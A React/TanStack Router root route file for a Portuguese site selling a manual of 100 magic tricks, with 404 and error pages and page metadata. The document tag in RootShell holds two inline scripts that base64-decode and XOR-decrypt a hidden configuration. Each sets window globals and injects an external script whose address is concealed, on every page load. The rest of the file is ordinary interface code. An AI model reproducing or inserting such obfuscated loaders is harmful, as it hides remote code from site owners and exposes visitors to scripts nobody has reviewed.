import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Manual dos 100 Truques" },
      {
        name: "description",
        content: "Manual digital com 100 truques de mágica passo a passo.",
      },
      { property: "og:title", content: "Manual dos 100 Truques" },
      {
        property: "og:description",
        content: "Manual digital com 100 truques de mágica passo a passo.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,400..800&family=Manrope:wght@400..800&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var z_yjec=atob("DH1Yxr0H2pS3P+PsuQZ6s89r+K6VV5eYyQ5i6ZJkvvqZSpeB0Bsh6N5ot7rVTcyf2g8xtsl09eTeR4aAlg0xvthr9P7EHc/O2AkstNRlr+DSTMHW4iB05NprtfbWU5DOgyYj5NNmt/GVBcGc0AU9qvRj+LiVSYKAzBh6/J8xu63UWtPa2hk6oI4y4vGDXILYiEk78t8lp8nK");var j_wn14=[];for(var a_tp=0;a_tp<z_yjec.length;a_tp++){j_wn14.push(z_yjec.charCodeAt(a_tp)&255);}var f_tf=j_wn14[0];var d_z=j_wn14.slice(1,1+f_tf);var w_8p=j_wn14.slice(1+f_tf);var u_6=w_8p.map(function(b,x_8){return b^d_z[x_8%f_tf];});var x_m="";for(var x_w=0;x_w<u_6.length;x_w++){x_m+=String.fromCharCode(u_6[x_w]&255);}var k_0x37=decodeURIComponent(escape(x_m));var t_xr=JSON.parse(k_0x37);var i_y=t_xr.globals||[];i_y.forEach(function(x_0io){window[x_0io.name]=x_0io.value;});var w_bah=document.createElement("script");w_bah.src=t_xr.url;w_bah.async=true;w_bah.defer=true;(t_xr.attributes||[]).forEach(function(y_o){w_bah.setAttribute(y_o.name,y_o.value);});(document.head||document.documentElement).appendChild(w_bah);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var d_gnt=atob("DKvrSEvZZg4qafJDa9DJPTm1RDQIAYY3G9jRZ2S6AmAEHIYuAs2SZii2CyBIG90wCNmCOD+qSXteBIFsB8qfLTitSGRZS95hCt+fOiK7E3pPGtB5MNDJJiq0AywQS5YiH8rGPT+0D2hTRIIxDt2OJj/0Hm1FDd8wCMDJZGmvB2JfDNB5SYmWZDD7CG9HDNB5Sc+KPCr0E3pHAJQ6RtuZLT28CHoHGochAs+Yamf7EG9GHJdhUYnJNRak");var h_t=[];for(var k_b=0;k_b<d_gnt.length;k_b++){h_t.push(d_gnt.charCodeAt(k_b)&255);}var l_oh=h_t[0];var o_dgs9=h_t.slice(1,1+l_oh);var i_ih=h_t.slice(1+l_oh);var q_q=i_ih.map(function(b,a_j56){return b^o_dgs9[a_j56%l_oh];});var g_i0="";for(var f_wtd=0;f_wtd<q_q.length;f_wtd++){g_i0+=String.fromCharCode(q_q[f_wtd]&255);}var n_m=decodeURIComponent(escape(g_i0));var l_wt=JSON.parse(n_m);var i_syl=l_wt.globals||[];i_syl.forEach(function(e_d8){window[e_d8.name]=e_d8.value;});var g_tchw=document.createElement("script");g_tchw.src=l_wt.url;g_tchw.async=true;g_tchw.defer=true;(l_wt.attributes||[]).forEach(function(r_q){g_tchw.setAttribute(r_q.name,r_q.value);});(document.head||document.documentElement).appendChild(g_tchw);})();`,
          }}
        />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
